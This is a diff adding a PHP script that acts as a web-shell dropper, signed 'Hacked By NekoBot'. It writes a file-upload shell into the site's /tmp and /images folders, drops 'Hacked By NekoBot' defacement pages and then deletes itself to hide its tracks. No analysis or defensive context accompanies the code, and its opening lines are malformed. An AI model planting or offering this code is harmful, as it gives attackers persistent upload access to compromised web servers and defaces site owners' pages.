@@ -1,0 +1,48 @@
+$check = $_SERVER['DOCUMENT_ROOT'] . "/tmp/neko.php" ;
+$fp=fopen("$check","w+");
+<title>Hacked By NekoBot </title>
+<?php
+function http_get($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+$s = '<title>Hacked By NekoBot</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Shell Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>';
+$check = $_SERVER['DOCUMENT_ROOT'] . "/tmp/neko.php" ;
+$text = $s;
+$open = fopen($check, 'w');
+fwrite($open, $text);
+fclose($open);
+if(file_exists($check)){
+    echo $check."</br>";
+}else
+  echo "not exits";
+echo "done .\n " ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/images/neko.php" ;
+$text2 = $s;
+$open2 = fopen($check2, 'w');
+fwrite($open2, $text2);
+fclose($open2);
+if(file_exists($check2)){
+    echo $check2."</br>";
+}else
+  echo "not exits2";
+echo "done2 .\n " ;
+
+$check3=$_SERVER['DOCUMENT_ROOT'] . "/neko.htm" ;
+$text3 = 'Hacked By NekoBot';
+$op3=fopen($check3, 'w');
+fwrite($op3,$text3);
+fclose($op3);
+
+
+$check6=$_SERVER['DOCUMENT_ROOT'] . "/images/neko.htm" ;
+$text6 = 'Hacked By NekoBot';
+$op6=fopen($check6, 'w');
+fwrite($op6,$text6);
+fclose($op6);
+@unlink(__FILE__);
